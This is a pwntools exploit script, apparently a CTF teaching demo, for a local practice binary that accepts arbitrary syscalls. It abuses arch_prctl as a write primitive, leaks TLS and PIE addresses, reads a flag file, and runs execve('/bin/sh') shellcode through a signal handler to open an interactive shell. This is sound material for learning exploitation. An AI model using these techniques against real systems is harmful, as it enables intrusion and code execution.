#encoding: utf-8

from pwn import *
import binascii

context.arch = 'amd64'

def syscall(rax, rdi=0, rsi=0, rdx=0, r10=0, r8=0, r9=0):
	r.sendlineafter('rax = ', str(rax))
	r.sendlineafter('rdi = ', str(rdi))
	r.sendlineafter('rsi = ', str(rsi))
	r.sendlineafter('rdx = ', str(rdx))
	r.sendlineafter('r10 = ', str(r10))
	r.sendlineafter('r8 = ', str(r8))
	r.sendlineafter('r9 = ', str(r9))

def DEBUG(script=""):
	gdb.attach(r, script)

r = process('./simple')

sys_read = 0
sys_write = 1
sys_open = 2
sys_mmap = 9
sys_mprotect = 10
sys_brk = 12
sys_rt_sigaction = 13
sys_writev = 20
sys_getpid = 39
sys_getdents = 78
sys_getcwd = 79
sys_arch_prctl = 158
sys_tgkill = 234
sys_openat = 257
ARCH_SET_GS = 0x1001
ARCH_GET_GS = 0x1004
AT_FDCWD = 0xffffff9c

# mmap at 0x10000
syscall(sys_mmap, 0x10000, 0x1000, 7, 0x22, -1, 0)

# create heap
syscall(sys_brk, 0)
r.recvuntil('rax = ')
heap_base = int(r.recvline().strip(), 16)
print("heap_base @ ", hex(heap_base))
syscall(sys_brk, heap_base+0x1000)


# mprotect
syscall(sys_mprotect, heap_base, 0x1000, 7)

# read
syscall(sys_read, 0, heap_base, 0x30)
r.sendline(flat(heap_base+0x20, 3, heap_base+0x28, 5, 'a'*8, 'b'*8))

# write data with writev 
syscall(sys_writev, 1, heap_base, 2)

# sys_arch_prctl(struct task_struct *task, int code, unsigned long *addr)
# 利用 set_gs 和 get_gs 任意寫入
# 最多只能寫 6 bytes(超過會變 0), 但會填入 8 bytes
syscall(sys_arch_prctl, ARCH_SET_GS, 0xfaceb0, 0)
syscall(sys_arch_prctl, ARCH_GET_GS, heap_base, 0)

# use mmap to leak tls address
# and use tls address can calculate libc address or leak pie stack canary etc.
syscall(sys_mmap, 0, 0x1000, 7, 34, -1, 0)
r.recvuntil('rax = ')
mmap_addr = int(r.recvline(), 16)
tls = mmap_addr + 0x1000
print("tls @ ", hex(tls))
pie_addr = tls + 0x2170

# leak pie
#DEBUG("b *$_pie()+0x8f9\nc")
syscall(sys_write, 1, pie_addr, 8)
pie_base = u64(r.recvn(8))
print("pie_base @ ", hex(pie_base))

# get cwd
syscall(sys_getcwd, mmap_addr, 0x40)
syscall(sys_write, 1, mmap_addr, 0x40)
print("cwd @ ", r.recvline()[:-12])

# get entry
entry_addr = 0x10000
syscall(sys_open, mmap_addr, 0x10000)
syscall(sys_getdents, 3, entry_addr, 0x100)
syscall(sys_write, 1, entry_addr, 0x90)
#print(r.recvuntil('rax'))

# openat
syscall(sys_read, 0, mmap_addr, 0x100)
r.sendline('flag.txt\x00')
syscall(sys_openat, AT_FDCWD, mmap_addr)

syscall(sys_read, 0, mmap_addr, 0x100)
r.sendline('/home/kruztw/Downloads/ctf_demo/demo/example/pwn/syscall/simple/flag.txt\x00') # must use absolute path
syscall(sys_openat, -1, mmap_addr)

# signal
# https://github.com/potato-gang/NahamconCTF/tree/master/SaaS
sh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode_addr = 0x10000
sigaction_addr = mmap_addr
signal = 1 # 隨便
sigaction = flat(shellcode_addr, 0x0000000004000000, shellcode_addr, 0)
syscall(sys_read, 0, shellcode_addr, 0x100)
r.sendline(sh)
syscall(sys_read, 0, sigaction_addr, 0x100)
r.sendline(sigaction)
syscall(sys_rt_sigaction, signal, sigaction_addr, 0, 8)
syscall(sys_getpid)
r.recvuntil('rax = ')
pid = int(r.recvline(), 16)
syscall(sys_tgkill, pid, pid, signal)

r.interactive()